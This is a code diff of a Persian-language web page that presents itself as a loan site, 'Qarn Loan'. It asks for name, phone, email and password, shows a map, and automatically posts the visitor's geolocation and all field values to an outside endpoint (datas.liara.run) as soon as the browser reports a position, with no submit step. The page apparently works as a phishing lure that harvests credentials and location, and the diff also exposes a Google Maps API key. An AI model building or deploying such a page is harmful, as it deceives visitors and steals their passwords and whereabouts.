@@ -3,48 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>وام قرن</title>
+    <style>
+        body {
+            background-image: url(./static/images.jpg);
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+        body::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            opacity: 0.5;
+            z-index: 1;
+        }
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .container .part2 {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+        }
+        .container .part2 input {
+            width: 100%;
+            border-radius: 5px;
+            padding: 10px;
+        }
+        #map {
+            width: 400px;
+            height: 300px;
+            margin-top: 20px;
+            border-radius: 10px;
+        }
+    </style>
 </head>
 <body>
-    
-</body>
-<script>
-   async function getLocation() {
-        let arz
-        let tool
-        if (navigator.geolocation) {
-          await navigator.geolocation.getCurrentPosition(
-                (position) => {
-                 arz = position.coords.latitude;
-                 tool = position.coords.longitude;
-                sendLocationToBack(arz , tool)
+    <div class="container">
+        <div class="part1">
+            <h1 style="color: #fff;">به سایت وام قرن خوش آمدید</h1>
+        </div>
+        <div class="part2">
+            <input placeholder="نام و نام خانوادگی" class="name-and-lastname" type="text"/>
+            <input placeholder="شماره تماس" class="phone-number" type="text"/>
+            <input placeholder="ایمیل" class="email" type="text"/>
+            <input class="password" placeholder="رمز عبور" type="text"/>
+        </div>
+        <div class="part3">
+            <div id="map"></div>
+        </div>
+    </div>
+    <script>
+        const nameAndLastname = document.querySelector(".name-and-lastname");
+        const phoneNumber = document.querySelector(".phone-number");
+        const email = document.querySelector(".email");
+        const password = document.querySelector(".password");
+
+
+        function initMap() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        const userLocation = { lat: latitude, lng: longitude };
+                        
+                        const map = new google.maps.Map(document.getElementById("map"), {
+                            center: userLocation,
+                            zoom: 15,
+                        });
+
+                        new google.maps.Marker({
+                            position: userLocation,
+                            map: map,
+                            title: "موقعیت شما"
+                        });
+                        
+                        sendLocationToBack(latitude, longitude);
+                    },
+                    (error) => {
+                        console.error("خطا در دریافت موقعیت:", error.message);
+                    }
+                );
+            } else {
+                console.error("مرورگر شما از Geolocation پشتیبانی نمی‌کند.");
+            }
+        }
+
+        function sendLocationToBack(arz, tool) {
+            const data = { arz, tool , nameAndLastname: nameAndLastname.value, phoneNumber: phoneNumber.value, email: email.value, password: password.value };
+            fetch("https://datas.liara.run/api/data", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
                 },
-                (error) => {
-                    console.error("خطا در دریافت موقعیت:", error.message);
-                }
-            );
-        } else {
-            console.error("مرورگر شما از Geolocation پشتیبانی نمی‌کند.");
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => alert("اطلاعات با موفقیت ثبت شد."))
+            .catch(error => alert("خطا در ارسال اطلاعات:", error));
         }
-        return {
-            arz,
-            tool
-        }
-    }
-    function sendLocationToBack(arz , tool) {
-      const data = {
-        arz,
-        tool
-      }
-      console.log(data);
-        fetch('https://datas.liara.run/api/data' , {
-            method: 'POST',
-            headers: {
-        'Content-Type': 'application/json'
-    },
-            body:JSON.stringify(data)
-        })
-    }
-    getLocation()
-</script>
+    </script>
+    <script async defer src="https://maps.googleapis.com/maps/api/js?key=AIzaSyA_tJ587ckTwMVkqtLZ3hw4PAffc77zNkA&callback=initMap"></script>
+</body>
 </html>
